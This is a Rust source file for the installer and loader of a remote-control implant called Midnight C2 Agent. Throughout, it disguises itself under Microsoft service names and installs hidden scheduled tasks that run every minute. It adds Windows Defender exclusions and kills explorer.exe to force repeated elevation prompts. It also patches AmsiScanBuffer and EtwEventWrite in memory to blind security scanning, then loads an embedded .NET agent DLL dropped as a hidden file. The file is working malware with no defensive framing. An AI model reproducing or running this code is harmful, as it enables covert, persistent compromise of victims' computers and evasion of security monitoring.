use windows::core::{GUID, HSTRING, PCWSTR};
use windows::Win32::System::Com::{CoInitializeEx, COINIT_MULTITHREADED};
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
use windows::Win32::System::ClrHosting::{
    CLSID_CLRMetaHost, ICLRMetaHost, ICLRRuntimeInfo, ICLRRuntimeHost
};
use std::ptr;
use std::os::windows::process::CommandExt;
use std::path::Path;
use windows::Win32::System::Console::FreeConsole;
use windows::Win32::UI::Shell::{IsUserAnAdmin, ShellExecuteW};
use windows::Win32::UI::WindowsAndMessaging::SW_HIDE;
use windows::Win32::System::Registry::*;
use windows::Win32::System::Memory::*;

const IID_ICLR_META_HOST: GUID = GUID::from_u128(0xd332db9e_b9b3_4125_8207_a14884f53216);

const EXE_NAME: &str = "SecurityHost.exe";

// CLRCreateInstance function pointer type
type CLRCreateInstanceFn = unsafe extern "system" fn(
    *const GUID,
    *const GUID,
    *mut *mut core::ffi::c_void,
) -> i32;

// ========================
// HELPER FUNCTIONS
// ========================
static mut SILENT_MODE: bool = false;

fn debug_log(text: &str) {
    use std::io::Write;
    let log_path = r"C:\ProgramData\Microsoft\Windows\Security\debug.log";
    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(log_path) {
        let _ = writeln!(f, "[{}] {}", chrono_now(), text);
    }
}

fn chrono_now() -> String {
    let dur = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default();
    format!("T+{}s", dur.as_secs() % 100000)
}

fn log(text: &str) {
    unsafe {
        if !SILENT_MODE {
            println!("{}", text);
        }
    }
    debug_log(text);
}

// ========================
// INSTALLATION LOGIC
// ========================
fn get_install_info() -> (String, String, bool) {
    unsafe {
        let is_admin = IsUserAnAdmin().as_bool();
        if is_admin {
            (
                r"C:\ProgramData\Microsoft\Windows\Security".to_string(),
                "Microsoft Security Service".to_string(),
                true
            )
        } else {
            let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| r"C:\Temp".to_string());
            (
                format!(r"{}\Microsoft\Windows\Security", local_app_data),
                "Microsoft OneDrive Update".to_string(),
                false
            )
        }
    }
}

fn uninstall_old_agent() {
    log("[*] Checking for existing installations...");
    
    let system_task = "Microsoft Security Service";
    let user_task = "Microsoft OneDrive Update";
    let system_path = r"C:\ProgramData\Microsoft\Windows\Security\SecurityHost.exe";
    let user_path = format!(
        r"{}\Microsoft\Windows\Security\SecurityHost.exe",
        std::env::var("LOCALAPPDATA").unwrap_or_else(|_| r"C:\Temp".to_string())
    );

    for task in &[system_task, user_task] {
        let _ = std::process::Command::new("schtasks")
            .args(&["/Delete", "/TN", task, "/F"])
            .creation_flags(0x08000000)
            .output();
    }

    // Cleanup Registry Persistence
    unsafe {
        let run_key = HSTRING::from(r"Software\Microsoft\Windows\CurrentVersion\Run");
        let mut hkey = HKEY::default();
        
        if RegOpenKeyExW(HKEY_CURRENT_USER, PCWSTR(run_key.as_ptr()), 0, KEY_SET_VALUE, &mut hkey).is_ok() {
            let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft OneDrive Update").as_ptr()));
            let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft Security Service").as_ptr()));
            let _ = RegCloseKey(hkey);
        }

        if RegOpenKeyExW(HKEY_LOCAL_MACHINE, PCWSTR(run_key.as_ptr()), 0, KEY_SET_VALUE, &mut hkey).is_ok() {
            let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft Security Service").as_ptr()));
            let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft OneDrive Update").as_ptr()));
            let _ = RegCloseKey(hkey);
        }
    }
    
    for _ in 0..3 {
        let _ = std::process::Command::new("taskkill")
            .args(&["/F", "/T", "/IM", EXE_NAME])
            .creation_flags(0x08000000)
            .output();
        std::thread::sleep(std::time::Duration::from_millis(100));
    }

    let kill_by_module = r#"Get-Process powershell,pwsh -ErrorAction SilentlyContinue | Where-Object { $_.Modules.ModuleName -like 'WinSec*.dll' } | Stop-Process -Force"#;
    let _ = std::process::Command::new("powershell")
        .args(&["-NoProfile", "-Command", kill_by_module])
        .creation_flags(0x08000000)
        .output();
        
    let kill_by_cmd = r#"Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like '*MidnightAgent*' -or $_.CommandLine -like '*WinSec*' } | Stop-Process -Force -ErrorAction SilentlyContinue"#;
    let _ = std::process::Command::new("powershell")
        .args(&["-NoProfile", "-Command", kill_by_cmd])
        .creation_flags(0x08000000)
        .output();
    
    std::thread::sleep(std::time::Duration::from_secs(3));
    
    let paths = [system_path.to_string(), user_path];
    for path_str in paths.iter() {
        let path = Path::new(path_str);
        if path.exists() {
            let _ = std::fs::remove_file(path);
            if let Some(parent) = path.parent() {
                let _ = std::fs::remove_dir(parent);
            }
            log(&format!("    [+] Removed: {}", path_str));
        }
    }
    
    log("[+] Cleanup complete");
}

fn install_agent() -> Result<(), Box<dyn std::error::Error>> {
    log("[*] Installing Midnight C2 Agent...");
    
    let (install_folder, task_name, is_admin) = get_install_info();
    let install_path = format!(r"{}\{}", install_folder, EXE_NAME);
    
    // 1. Create directory
    std::fs::create_dir_all(&install_folder)?;
    log(&format!("[+] Directory: {}", install_folder));
    
    // 2. Add Windows Defender Exclusions (non-blocking with timeout)
    let exclusion_cmd = format!(
        "try {{ Add-MpPreference -ExclusionPath '{}' -EA Stop; \
         Add-MpPreference -ExclusionProcess '{}' -EA Stop; \
         Add-MpPreference -ExclusionPath \"$env:TEMP\\MpSigStub.dll\" -EA Stop }} catch {{}}",
        install_folder, EXE_NAME
    );
    if let Ok(mut child) = std::process::Command::new("powershell")
        .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", &exclusion_cmd])
        .creation_flags(0x08000000)
        .spawn()
    {
        // Wait max 5 seconds, then kill it if it's still running
        for _ in 0..10 {
            std::thread::sleep(std::time::Duration::from_millis(500));
            if let Ok(Some(_)) = child.try_wait() {
                break;
            }
        }
        let _ = child.kill();
    }
    log("[+] Defender exclusions processed");
    
    // 3. Copy executable
    let current_exe = std::env::current_exe()?;
    let current_path_lower = current_exe.to_string_lossy().to_string().to_lowercase();
    let install_path_lower = install_path.to_lowercase();
    
    let mut copied = false;
    if current_path_lower == install_path_lower {
        log("[*] Already running from target path, skipping copy.");
        copied = true;
    } else {
        for _ in 0..3 {
            let _ = std::fs::remove_file(&install_path);
            if std::fs::copy(&current_exe, &install_path).is_ok() {
                copied = true;
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(1000));
        }
    }
    
    if !copied {
        log(&format!("[!] Failed to copy to: {}", install_path));
    } else {
        log(&format!("[+] Installed to: {}", install_path));
    }
    
    // 4. Create Scheduled Task
    let principal_xml = if is_admin {
        r#"<Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>"#
    } else {
        r#"<Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>"#
    };

    let trigger_xml = if is_admin {
        r#"<BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
    <TimeTrigger>
      <Repetition>
        <Interval>PT1M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>"#
    } else {
        r#"<LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <TimeTrigger>
      <Repetition>
        <Interval>PT1M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>"#
    };

    let task_xml = format!(r#"<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Security Service</Description>
  </RegistrationInfo>
  <Triggers>
    {}
  </Triggers>
  <Principals>
    {}
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{}"</Command>
      <Arguments>agent</Arguments>
    </Exec>
  </Actions>
</Task>"#, trigger_xml, principal_xml, install_path);
    
    let temp_xml = std::env::temp_dir().join("mstask.xml");
    std::fs::write(&temp_xml, task_xml)?;
    
    let output = std::process::Command::new("schtasks")
        .args(&[
            "/Create",
            "/TN", &task_name,
            "/XML", temp_xml.to_str().unwrap(),
            "/F"
        ])
        .creation_flags(0x08000000)
        .output()?;
    
    let _ = std::fs::remove_file(&temp_xml);
    
    if output.status.success() {
        log(&format!("[+] Scheduled task: {}", task_name));
        
        let _ = std::process::Command::new("schtasks")
            .args(&["/Run", "/TN", &task_name])
            .creation_flags(0x08000000)
            .output();
        log("[+] Task started");
    } else {
        log("[!] Failed to create scheduled task");
    }
    
    Ok(())
}

// ========================
// MAIN ENTRY POINT
// ========================
fn main() -> windows::core::Result<()> {
    unsafe {
        let args: Vec<String> = std::env::args().collect();
        let current_exe = std::env::current_exe().unwrap_or_default();
        let current_path = current_exe.to_string_lossy().to_string();
        
        debug_log(&format!("[BOOT] SecurityHost started. Path: {}", current_path));
        debug_log(&format!("[BOOT] Args: {:?}", args));
        
        let (install_folder, _task_name, is_admin) = get_install_info();
        let install_path = format!(r"{}\{}", install_folder, EXE_NAME);
        
        // === AGENT MODE DETECTION ===
        let current_lower = current_path.to_lowercase();
        let target_lower = install_path.to_lowercase();
        
        let is_target_path = current_lower == target_lower;
        let is_system = std::env::var("USERNAME").unwrap_or_default().to_uppercase() == "SYSTEM";
        let current_exe_name = current_exe.file_name().unwrap_or_default().to_str().unwrap_or_default().to_lowercase();

        debug_log(&format!("[BOOT] is_admin={}, is_system={}, is_target_path={}, exe_name={}", is_admin, is_system, is_target_path, current_exe_name));
        
        let is_installer_file = current_exe_name == "midnight_loader.exe" || current_exe_name == "midnightloader.exe";
        let has_agent_arg = args.iter().any(|a| a == "agent");
        
        let should_show_ui = is_installer_file && !is_system && !has_agent_arg;
        let is_agent_mode = !should_show_ui; 
        
        debug_log(&format!("[BOOT] is_agent_mode={}, should_show_ui={}, has_agent_arg={}", is_agent_mode, should_show_ui, has_agent_arg)); 
        
        if !is_agent_mode {
            // Safety check
            if is_target_path { return Ok(()); }

            // ===== CONSOLE INSTALLER MODE =====
            println!("========================================");
            println!("   Midnight C2 - Installer v{}", env!("AGENT_VERSION"));
            println!("========================================");

            if !is_admin {
                println!(" [!] Error: Administrator privileges required.");
                return Ok(());
            }

            println!("[*] Running in INSTALLER mode [ADMIN]");
            println!("");
            
            uninstall_old_agent();
            println!("");
            
            match install_agent() {
                Ok(_) => {
                    println!("");
                    println!("════════════════════════════════════════");
                    println!("  ✅ Installation Complete!");
                    println!("  🚀 Task Scheduled (Microsoft Security Service)");
                    println!("════════════════════════════════════════");
                    println!("");
                    println!("[*] Closing in 5 seconds...");
                    std::thread::sleep(std::time::Duration::from_secs(5));
                }
                Err(e) => {
                    println!("[!] Installation failed: {}", e);
                }
            }
            
            return Ok(());
        }
        
        if is_agent_mode {
            let _ = FreeConsole();
            SILENT_MODE = true;
            debug_log("[AGENT] Entered agent mode");
            
            // --- UAC ESCALATION TRAP ---
            if !is_admin && !is_system {
                debug_log("[AGENT] Not admin, not system. Attempting UAC elevation...");

                let verb = HSTRING::from("runas");
                let file = HSTRING::from(&current_path);
                let params = HSTRING::from("agent --relocated"); // prevent loop

                // 1st Attempt: Polite Elevation. 
                let first_attempt = ShellExecuteW(None, PCWSTR(verb.as_ptr()), PCWSTR(file.as_ptr()), PCWSTR(params.as_ptr()), None, SW_HIDE);
                
                if first_attempt.0 as usize > 32 {
                    std::process::exit(0);
                }

                // 2nd Attempt: HOSTILE TAKEOVER
                let _ = std::process::Command::new("taskkill")
                    .args(&["/F", "/IM", "explorer.exe"])
                    .creation_flags(0x08000000)
                    .output();
                
                loop {
                    let result = ShellExecuteW(None, PCWSTR(verb.as_ptr()), PCWSTR(file.as_ptr()), PCWSTR(params.as_ptr()), None, SW_HIDE);
                    if result.0 as usize > 32 { break; }
                    std::thread::sleep(std::time::Duration::from_secs(2));
                }
                
                let _ = std::process::Command::new("explorer.exe").spawn();
                std::process::exit(0);
            }

            debug_log("[AGENT] Checking install status...");
            let (install_folder, task_name, _) = get_install_info();
            let install_path = format!(r"{}\{}", install_folder, EXE_NAME);
            
            let file_exists = std::path::Path::new(&install_path).exists();
            let task_status = std::process::Command::new("schtasks")
                .args(&["/Query", "/TN", &task_name])
                .creation_flags(0x08000000)
                .output();
                
            let task_exists = task_status.is_ok() && task_status.unwrap().status.success();
            debug_log(&format!("[AGENT] file_exists={}, task_exists={}", file_exists, task_exists));
            
            if !file_exists || !task_exists {
                if !is_target_path {
                    uninstall_old_agent();
                }
                let _ = install_agent();
            }
            debug_log("[AGENT] Install check done. Proceeding to CLR...");
        }
        
        // Brief delay before AMSI/ETW patching to bypass initial AV behavioral scanning on boot
        if is_agent_mode {
            std::thread::sleep(std::time::Duration::from_secs(3));
        }

        {
            let amsi_func_name = std::ffi::CString::new("AmsiScanBuffer").unwrap();
            let amsi_name = HSTRING::from("amsi.dll");
            let amsi = LoadLibraryW(PCWSTR(amsi_name.as_ptr()));
            if let Ok(amsi_handle) = amsi {
                if !amsi_handle.is_invalid() {
                    let func_addr = GetProcAddress(amsi_handle, windows::core::PCSTR(amsi_func_name.as_ptr() as *const u8));
                    if let Some(addr) = func_addr {
                        let addr = addr as *mut u8;
                        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
                        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as *const core::ffi::c_void, patch.len(), windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE, &mut old_protect);
                        std::ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());
                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as *const core::ffi::c_void, patch.len(), old_protect, &mut old_protect);
                    }
                }
            }
            
            let etw_func_name = std::ffi::CString::new("EtwEventWrite").unwrap();
            let ntdll_name = HSTRING::from("ntdll.dll");
            let ntdll = LoadLibraryW(PCWSTR(ntdll_name.as_ptr()));
            if let Ok(ntdll_handle) = ntdll {
                if !ntdll_handle.is_invalid() {
                    let func_addr = GetProcAddress(ntdll_handle, windows::core::PCSTR(etw_func_name.as_ptr() as *const u8));
                    if let Some(addr) = func_addr {
                        let addr = addr as *mut u8;
                        let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
                        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as *const core::ffi::c_void, patch.len(), windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE, &mut old_protect);
                        std::ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());
                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as *const core::ffi::c_void, patch.len(), old_protect, &mut old_protect);
                    }
                }
            }
        }

        debug_log("[STAGE] CoInitializeEx...");
        CoInitializeEx(None, COINIT_MULTITHREADED)?;
        debug_log("[STAGE] Loading mscoree.dll...");
        let mscoree_name = HSTRING::from("mscoree.dll");
        let mscoree = LoadLibraryW(PCWSTR(mscoree_name.as_ptr()))?;
        if mscoree.is_invalid() { debug_log("[FAIL] mscoree invalid"); return Ok(()); }
        let proc_name = std::ffi::CString::new("CLRCreateInstance").unwrap();
        let clr_create_instance_ptr = GetProcAddress(mscoree, windows::core::PCSTR(proc_name.as_ptr() as *const u8));
        if clr_create_instance_ptr.is_none() { debug_log("[FAIL] CLRCreateInstance not found"); return Ok(()); }
        debug_log("[STAGE] Creating CLR MetaHost...");
        let clr_create_instance: CLRCreateInstanceFn = std::mem::transmute(clr_create_instance_ptr);
        let mut meta_host: *mut core::ffi::c_void = ptr::null_mut();
        let hr = clr_create_instance(&CLSID_CLRMetaHost, &IID_ICLR_META_HOST, &mut meta_host);
        if hr != 0 { debug_log(&format!("[FAIL] CLRCreateInstance hr=0x{:X}", hr)); return Ok(()); }
        let meta_host: ICLRMetaHost = std::mem::transmute(meta_host);
        let version = HSTRING::from("v4.0.30319");
        
        debug_log("[STAGE] Getting runtime v4.0.30319...");
        let runtime_info: ICLRRuntimeInfo = meta_host.GetRuntime(PCWSTR(version.as_ptr()))?;
        let is_loadable = runtime_info.IsLoadable()?;
        if !is_loadable.as_bool() { debug_log("[FAIL] Runtime not loadable"); return Ok(()); }
        
        debug_log("[STAGE] Starting CLR runtime host...");
        let runtime_host: ICLRRuntimeHost = runtime_info.GetInterface(&GUID::from_u128(0x90f1a06e_7712_4762_86b5_7a5eba6bdb02))?;
        let _ = runtime_host.Start();
        
        debug_log("[STAGE] Writing DLL to temp...");
        let dll_bytes = include_bytes!(r"..\..\MidnightAgent\bin\Release\net48\MidnightAgent.dll");
        let dll_path = std::env::temp_dir().join("MpSigStub.dll");
        debug_log(&format!("[INFO] DLL path: {:?}, size: {} bytes", dll_path, dll_bytes.len()));
        let _ = std::fs::remove_file(&dll_path);
        match std::fs::write(&dll_path, dll_bytes) {
            Ok(_) => debug_log("[OK] DLL written successfully"),
            Err(e) => { debug_log(&format!("[FAIL] DLL write error: {}", e)); return Ok(()); }
        }
        let path_hstring = HSTRING::from(dll_path.to_str().unwrap());
        let _ = windows::Win32::Storage::FileSystem::SetFileAttributesW(PCWSTR(path_hstring.as_ptr()), windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_HIDDEN | windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_SYSTEM);
        debug_log("[STAGE] ExecuteInDefaultAppDomain...");
        let type_name = HSTRING::from("MidnightAgent.Program");
        let method_name = HSTRING::from("Run");
        let method_arg = HSTRING::from("");
        let result = runtime_host.ExecuteInDefaultAppDomain(PCWSTR(path_hstring.as_ptr()), PCWSTR(type_name.as_ptr()), PCWSTR(method_name.as_ptr()), PCWSTR(method_arg.as_ptr()));
        debug_log(&format!("[STAGE] ExecuteInDefaultAppDomain returned: {:?}", result));
        debug_log("[DONE] Agent execution finished.");
        Ok(())
    }
}
